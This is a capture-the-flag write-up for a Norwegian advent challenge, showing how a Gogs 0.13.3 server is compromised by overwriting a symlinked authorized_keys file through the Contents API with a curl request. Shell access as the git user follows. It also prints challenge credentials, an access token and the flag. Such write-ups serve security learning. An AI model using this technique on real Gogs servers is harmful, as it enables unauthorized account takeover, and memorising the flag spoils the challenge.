# Cybernissens hjemmeserver, Luke_20

**Author**: tweey

**Description**:
>Cybernissen har satt opp en hjemmelaget Git-tjener ved hjelp av Gogs, kjørt i en Ubuntu-container. Din oppgave er å kartlegge oppsettet, undersøke konfigurasjonen og finne det skjulte flagget i /home/git/user.txt. Tilgang til SSH med credentials: `Cyber:Cyber123!` Når du kjører SSH kommandoen under vil Git-tjeneren, Gogs, være tilgjengelig på <http://localhost:3000>

## Writeup

- Gogs 0.13.3 (`5084b4a9b77a506f5e287e82e945e1c6882b827a`) on `http://localhost:3000`
- SSH to container: `ssh -o ProxyCommand="openssl s_client -quiet -connect ead67e35b7a32a2b.julec.tf:1337" Cyber@localhost` (pass `Cyber123!`)
- Goal: read `/home/git/user.txt`

## Exploit (symlink overwrite via Contents API)

Public repo `hacker/sym_link` was added, and symlinks:
    - `my_symlink -> /home/git/user.txt`
    - `authorized_keys -> /home/git/.ssh/authorized_keys`
Raw view of symlinks returns 500 (no LFI). Archives keep symlinks without deref.
Created user with Gogs creds: `hacker` / `hacker123`, and create a Personal Access Token from Settings → Applications.

Overwrote the symlinked `authorized_keys` via the Contents API to drop our SSH key:

```bash
b64=$(base64 < id_rsa.pub | tr -d '\n')
curl -X PUT \
  -H "Authorization: token 37520109a3821cf4a21733ef4b234c2ba9d304a6" \
  -H "Content-Type: application/json" \
  -d '{"message":"pwn","content":"'"$b64"'","branch":"master"}' \
  http://localhost:3000/api/v1/repos/hacker/sym_link/contents/authorized_keys
```

(The API follows the repo symlink and writes into `/home/git/.ssh/authorized_keys`.)

SSH as `git` with the provided `id_rsa` and read the flag:

```bash
ssh -o StrictHostKeyChecking=no \
    -o ProxyCommand="openssl s_client -quiet -connect ead67e35b7a32a2b.julec.tf:1337" \
    -i id_rsa git@localhost "cat /home/git/user.txt"
```

## Flag

`JUL{g0gs_on_cybernissens_hjemmeserver}`

## Notes

- The vulnerability is the Contents API writing through symlinks inside the repo (CVE-2025-8110-style). Raw endpoints blocked deref, but writes still followed targets.
- Default install page disabled; captchas for signup were solvable (e.g., `031048`, `288812`), but unnecessary after finding the `hacker` creds.
- Other avenues tried (older RCE, raw LFI, tar tricks) were unnecessary once the symlink overwrite landed.
